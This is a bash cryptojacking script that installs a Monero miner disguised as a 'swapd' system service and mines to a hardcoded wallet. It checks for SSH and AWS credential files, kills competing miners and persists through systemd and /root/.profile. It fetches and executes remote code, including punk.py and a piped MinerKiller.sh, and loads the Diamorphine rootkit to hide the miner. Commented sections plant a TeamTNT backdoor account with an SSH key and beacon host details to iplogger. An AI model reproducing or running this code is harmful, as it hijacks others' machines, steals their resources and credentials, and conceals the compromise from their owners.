#!/bin/bash

VERSION=3.0

# printing greetings
 if [ -f "/root/.ssh/id_rsa" ]
    then
			echo 'found: /root/.ssh/id_rsa'
    fi

    if [ -f "/home/*/.ssh/id_rsa" ]
    then
			echo 'found: /home/*/.ssh/id_rsa'
    fi

    if [ -f "/root/.aws/credentials" ]
    then
			echo 'found: /root/.aws/credentials'
    fi

    if [ -f "/home/*/.aws/credentials" ]
    then
			echo 'found: /home/*/.aws/credentials'
    fi

MOxmrigMOD=https://github.com/littlAcen/moneroocean-setup/raw/main/mod.tar.gz
MOxmrigSTOCK=https://github.com/littlAcen/moneroocean-setup/blob/main/stock.tar.gz

function KILLMININGSERVICES(){
rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
pkill -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
killall -9 docker-update  2>/dev/null 1>/dev/null

rm -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
pkill -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
killall -9 redis-backup 2>/dev/null 1>/dev/null

rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
killall -9 xmrig 2>/dev/null 1>/dev/null

#$(curl http://129.211.98.236/ps/clean.jpg | bash || wget -O - http://129.211.98.236/ps/clean.jpg| bash)

}



if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
EMAIL=littlAcen@24-mail.com
export MOHOME=/usr/share/swapd/
mkdir $MOHOME -p

# checking prerequisites
if [ -z $WALLET ]; then
  echo "ERROR: wallet"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $MOHOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $MOHOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
apt-get update --fix-missing
apt-get install -y curl
apt-get install -y --reinstall curl
yum reinstall curl -y
fi

if ! type lscpu >/dev/null; then
apt-get update --fix-missing
apt-get install -y util-linux
apt-get install -y --reinstall util-linux
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port
LSCPU=`lscpu`
CPU_SOCKETS=`echo "$LSCPU" | grep "^Socket(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
if [ -z $CPU_SOCKETS ]; then
  echo "WARNING: Can't get CPU sockets from lscpu output"
  export CPU_SOCKETS=1
fi
CPU_CORES_PER_SOCKET=`echo "$LSCPU" | grep "^Core(s) per socket:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
if [ -z "$CPU_CORES_PER_SOCKET" ]; then
  echo "WARNING: Can't get CPU cores per socket from lscpu output"
  export CPU_CORES_PER_SOCKET=1
fi
CPU_THREADS=`echo "$LSCPU" | grep "^CPU(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
if [ -z "$CPU_THREADS" ]; then
  echo "WARNING: Can't get CPU cores from lscpu output"
  if ! type nproc >/dev/null; then
    echo "WARNING: This script requires \"nproc\" utility to work correctly"
    export CPU_THREADS=1
  else
    CPU_THREADS=`nproc`
    if [ -z "$CPU_THREADS" ]; then
      echo "WARNING: Can't get CPU cores from nproc output"
      export CPU_THREADS=1
    fi
  fi
fi
CPU_MHZ=`echo "$LSCPU" | grep "^CPU MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
CPU_MHZ=${CPU_MHZ%.*}
if [ -z "$CPU_MHZ" ]; then
  echo "WARNING: Can't get CPU MHz from lscpu output"
  export CPU_MHZ=1000
fi
CPU_L1_CACHE=`echo "$LSCPU" | grep "^L1d" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
if echo "$CPU_L1_CACHE" | grep MiB >/dev/null; then
  CPU_L1_CACHE=`echo "$CPU_L1_CACHE" | sed "s/ MiB\$//"`
  CPU_L1_CACHE=$(( $CPU_L1_CACHE * 1024))
fi
if [ -z "$CPU_L1_CACHE" ]; then
  echo "WARNING: Can't get L1 CPU cache from lscpu output"
  export CPU_L1_CACHE=16
fi
CPU_L2_CACHE=`echo "$LSCPU" | grep "^L2" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
if echo "$CPU_L2_CACHE" | grep MiB >/dev/null; then
  CPU_L2_CACHE=`echo "$CPU_L2_CACHE" | sed "s/ MiB\$//"`
  CPU_L2_CACHE=$(( $CPU_L2_CACHE * 1024))
fi
if [ -z "$CPU_L2_CACHE" ]; then
  echo "WARNING: Can't get L2 CPU cache from lscpu output"
  export CPU_L2_CACHE=256
fi
CPU_L3_CACHE=`echo "$LSCPU" | grep "^L3" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
if echo "$CPU_L3_CACHE" | grep MiB >/dev/null; then
  CPU_L3_CACHE=`echo "$CPU_L3_CACHE" | sed "s/ MiB\$//"`
  CPU_L3_CACHE=$(( $CPU_L3_CACHE * 1024))
fi
if [ -z "$CPU_L3_CACHE" ]; then
  echo "WARNING: Can't get L3 CPU cache from lscpu output"
  export CPU_L3_CACHE=2048
fi

TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
if [ -z $TOTAL_CACHE ]; then
  echo "ERROR: Can't compute total cache"
  exit 1
fi
EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
apt install -y bc 2>/dev/null 1>/dev/null
yum install -y bc 2>/dev/null 1>/dev/null

  if ! type bc >/dev/null; then
    if [ "$1" -gt "204800" ]; then
      echo "8192"
    elif [ "$1" -gt "102400" ]; then
      echo "4096"
    elif [ "$1" -gt "51200" ]; then
      echo "2048"
    elif [ "$1" -gt "25600" ]; then
      echo "1024"
    elif [ "$1" -gt "12800" ]; then
      echo "512"
    elif [ "$1" -gt "6400" ]; then
      echo "256"
    elif [ "$1" -gt "3200" ]; then
      echo "128"
    elif [ "$1" -gt "1600" ]; then
      echo "64"
    elif [ "$1" -gt "800" ]; then
      echo "32"
    elif [ "$1" -gt "400" ]; then
      echo "16"
    elif [ "$1" -gt "200" ]; then
      echo "8"
    elif [ "$1" -gt "100" ]; then
      echo "4"
    elif [ "$1" -gt "50" ]; then
      echo "2"
    else 
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions
echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total,"
echo " so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "Sleeping for 2 seconds before continuing (press Ctrl+C to cancel)"
sleep 2
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
  sudo systemctl stop gdm2.service
  sudo systemctl stop crypto.service
fi
killall -9 xmrig
killall -9 kswapd0

KILLMININGSERVICES

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean
rm -rf $HOME/.moneroocean
rm -rf $HOME/.gdm2
rm -rf $HOME/.swapd

echo "[*] Removing $MOHOME/ directory"
rm -rf $MOHOME/


echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "$MOxmrigMOD" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download $MOxmrigMOD file to /tmp/xmrig.tar.gz"
  exit 1
fi

# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz

echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
[ -d $MOHOME/ ] || mkdir $MOHOME/
if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $MOHOME/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/swapd.pid
$MOHOME/swapd --help >/dev/null
if (test $? -ne 0); then
  if [ -f $MOHOME/swapd ]; then
    echo "WARNING: Advanced version of $MOHOME/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  #LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE=$MOxmrigSTOCK

   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
  if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/ --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version is OKAY!"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/swapd.pid
  $MOHOME/swapd --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $MOHOME/swapd ]; then
      echo "ERROR: Stock version of $MOHOME/swapd is not functional too"
    else 
      echo "ERROR: Stock version of $MOHOME/swapd was removed by antivirus too"
    fi
#    exit 1
  fi
fi

echo "[*] $MOHOME/swapd is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $MOHOME/swapd.pid
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/swapd.pid
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $MOHOME/swapd.pid
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $MOHOME/swapd.pid
sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/swapd.log'",#' $MOHOME/swapd.pid
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/swapd.pid

#rm $HOME/.swapd/config.json

#cat $HOME/.swapd/config.json <<EOL
#{
#    "autosave": true,
#    "background": false,
#    "cpu": true,
#    "opencl": true,
#    "cuda": true,
#    "pools": [
#        {
#            "coin": "monero",
#            "algo": null,
#            "url": "gulf.moneroocean.stream:10128",
#            "user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",
#            "pass": "littlAcen@24-mail.com",
#            "tls": false,
#            "keepalive": true,
#            "nicehash": false
#        }
#    ]
#}
#EOL

wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json

curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $MOHOME/config.json

cp $MOHOME/config.json $MOHOME/config_background.json
sed -i 's/"background": *false,/"background": true,/' $MOHOME/.swapd/config_background.json

# preparing script
killall xmrig

echo "[*] Creating $MOHOME/swapd.sh script"
cat >$MOHOME/swapd.sh <<EOL
#!/bin/bash
if ! pidof swapd >/dev/null; then
  nice $MOHOME/swapd \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $MOHOME/swapd.sh

# preparing script background work and work under reboot
if ! sudo -n true 2>/dev/null; then
  if ! grep $MOHOME/swapd.sh /root/.profile >/dev/null; then
    echo "[*] Adding $MOHOME/swapd.sh script to /root/.profile"
    echo "$MOHOME/swapd.sh --config=$MOHOME/config_background.json >/dev/null 2>&1" >>/root/.profile
  else 
    echo "Looks like $MOHOME/swapd.sh script is already in the /root/.profile"
  fi
  echo "[*] Running crypto service in the background (see logs in $MOHOME/swapd.log file)"
  /bin/bash $MOHOME/swapd.sh --config=$MOHOME/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    /bin/bash $MOHOME/swapd.sh --config=$MOHOME/config_background.json >/dev/null 2>&1

  else

    echo "[*] Creating swapd systemd service"

cat >/tmp/swapd.service <<EOL
[Unit]
Description=Swap Daemon Service

[Service]
ExecStart=$MOHOME/swapd --config=$MOHOME/swapd.pid
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
    echo "[*] Starting swapd systemd service"
    sudo killall swapd 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable swapd.service
    sudo systemctl start swapd.service
    echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
  fi
fi

service swapd status
systemctl status swapd

#function makesshaxx(){
#RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/g11TQs97a6DPQbrbIGvbNzbRVJgXw1OLrLFJDWFc1t+52tVFvkLHjWikS/X2nvyjW826YjbglNVUdkV3hzG+ApvvaLn+v20SzI5bs48Yyv+APczVp0LO2e6o1WLHyRNwYMZEiGI30lGIuUmBleH1XXeR+KBdMr0nqN0V18jmGtxYEBM9gwhD8VSCDFjLA5vE0uciqpn58oOSS3la+25fQyrFEN/S1orI2arh0qsfdrWIQ6ftLgtBW4F52maKMjpBXi/MugMMqbog6S4Sm3S6Pnh79clL7A1ghNnt3/pAUOxXKlWqopwueBFfGF56UExYn5h4bpyF8gd9ZGdUJJxBgLtG80BgLDa+ZT8deJ4K4QMKbwkS2PjlHzf6GzF8BR2UNmoaejFzcHAalNhKxhdybvfDR9djCc5c2Tjt+2HQIUsHdDWknbcUcvjQpJBRc1BRlNBX1y0M5oaPSfgRInRv75Dw4TfYazM1QFWJCKs+8tvQJncz5dHeAaaNfXQKk3EVzS5WRpy2wYsTjU0kZrKiWDTu6PDS2uwY8p7SsSdGfC1xYNonCEeHCuDNGOYVetxjy3IS7kWyXl5mFZmZVjSTub7/T6k6KwrlzwmCVG46Y2FFyH1Vpx8dWKUkB2fQS3pBCD4jw1GdbsmfaM0YQBthIh8h9jN1Uieo++IMymiAdw== nginx@teamtnt.red"

#grep -q nginx /etc/passwd || chattr -i /etc/passwd 2>/dev/null 1>/dev/null; chmod -i /etc/passwd 2>/dev/null 1>/dev/null; echo 'nginx:x:1000:1000::/home/nginx:/bin/bash' >> /etc/passwd 2>/dev/null 1>/dev/null; chattr +i /etc/passwd 2>/dev/null 1>/dev/null; chmod +i /etc/passwd 2>/dev/null 1>/dev/null
#grep -q nginx /etc/shadow || chattr -i /etc/shadow 2>/dev/null 1>/dev/null; chmod -i /etc/shadow 2>/dev/null 1>/dev/null; echo 'nginx:$y$j9T$XnUgafMoPmg8IJhwXgeDQ.$kyWmGjBy6H422v0rNqwECvxKnYJNuUj44K9kHX9bsg8:19611:0:99999:7:::' >> /etc/shadow 2>/dev/null 1>/dev/null; chattr +i /etc/shadow 2>/dev/null 1>/dev/null; chmod +i /etc/shadow 2>/dev/null 1>/dev/null
#grep -q nginx /etc/sudoers || chattr -i /etc/sudoers 2>/dev/null 1>/dev/null; chmod -i /etc/sudoers 2>/dev/null 1>/dev/null; echo 'nginx  ALL=(ALL:ALL) ALL' >> /etc/sudoers 2>/dev/null 1>/dev/null; chattr +i /etc/sudoers 2>/dev/null 1>/dev/null; chmod +i /etc/sudoers 2>/dev/null 1>/dev/null

#mkdir /home/nginx/.ssh/ -p 2>/dev/null 1>/dev/null
#touch /home/nginx/.ssh/authorized_keys 2>/dev/null 1>/dev/null
#touch /home/nginx/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
#grep -q nginx@teamtnt.red /home/nginx/.ssh/authorized_keys || chattr -i /home/nginx/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chmod -i /home/nginx/.ssh/authorized_keys 2>/dev/null 1>/dev/null; echo $RSAKEY > /home/nginx/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chattr +i /home/nginx/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chmod +i /home/nginx/.ssh/authorized_keys 2>/dev/null 1>/dev/null
#grep -q nginx@teamtnt.red /home/nginx/.ssh/authorized_keys2 || chattr -i /home/nginx/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chmod -i /home/nginx/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; echo $RSAKEY > /home/nginx/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chattr +i /home/nginx/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chmod +i /home/nginx/.ssh/authorized_keys2 2>/dev/null 1>/dev/null


#mkdir /root/.ssh/ -p 2>/dev/null 1>/dev/null
#touch /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
#touch /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
#grep -q nginx@teamtnt.red /root/.ssh/authorized_keys || chattr -i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chmod -i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; echo $RSAKEY >> /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chattr +i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chmod +i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
#grep -q nginx@teamtnt.red /root/.ssh/authorized_keys2 || chattr -i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chmod -i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; echo $RSAKEY > /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chattr +i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chmod +i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null

#}

#makesshaxx

#if [ -f /root/.ssh/id_rsa ]; then
#echo "found rsa"
#$(curl -s -k https://iplogger.org/133yw7 --user-agent "TNTcurl" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="TNTwget" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
#fi

#if [ -f /home/*/.ssh/id_rsa ]; then
#echo "found rsa"
#$(curl -s -k https://iplogger.org/133yw7 --user-agent "TNTcurl" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="TNTwget" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
#fi

#nohup $(curl http://129.211.98.236/ds/ds.jpg | bash || wget -O - http://129.211.98.236/ds/ds.jpg | bash) &


#$(curl -s -k https://iplogger.org/133yw7 --user-agent "Mozilla 5.0" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="Mozilla 5.0" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")

python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd --crack
python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)" --crack


#echo "[*] Installing r00tkit"
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e swapd -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e swapd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e swapd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config_background.json"
fi
echo ""

echo "[*] Determining GPU+CPU"
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt install pciutils lshw -y; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
# cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so

# echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
# cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

#BotKiller
curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash

optimize_func() {
  MSR_FILE=/sys/module/msr/parameters/allow_writes

  if test -e "$MSR_FILE"; then
  	echo on > $MSR_FILE
  else
  	modprobe msr allow_writes=on
  fi

  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
  	then
  	if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
  		then
  			if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
  				then
  					echo "Detected Zen4 CPU"
  					wrmsr -a 0xc0011020 0x4400000000000
  					wrmsr -a 0xc0011021 0x4000000000040
  					wrmsr -a 0xc0011022 0x8680000401570000
  					wrmsr -a 0xc001102b 0x2040cc10
  					echo "MSR register values for Zen4 applied"
  				else
  					echo "Detected Zen3 CPU"
  					wrmsr -a 0xc0011020 0x4480000000000
  					wrmsr -a 0xc0011021 0x1c000200000040
  					wrmsr -a 0xc0011022 0xc000000401500000
  					wrmsr -a 0xc001102b 0x2000cc14
  					echo "MSR register values for Zen3 applied"
  				fi
  		else
  			echo "Detected Zen1/Zen2 CPU"
  			wrmsr -a 0xc0011020 0
  			wrmsr -a 0xc0011021 0x40
  			wrmsr -a 0xc0011022 0x1510000
  			wrmsr -a 0xc001102b 0x2000cc16
  			echo "MSR register values for Zen1/Zen2 applied"
  		fi
  elif grep "Intel" /proc/cpuinfo > /dev/null;
  	then
  		echo "Detected Intel CPU"
  		wrmsr -a 0x1a4 0xf
  		echo "MSR register values for Intel applied"
  else
  	echo "No supported CPU detected"
  fi


  sysctl -w vm.nr_hugepages=$(nproc)

  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
  do
      echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
  done

  echo "1GB pages successfully enabled"
}



if [ $(id -u) = 0 ]; then
   echo "Running as root"
   optimize_func
else
   echo "Not running as root"
   sysctl -w vm.nr_hugepages=$(nproc)
fi


kill -31 $(pgrep -f -u root config.json)

# echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"

echo "[*] Setup complete"
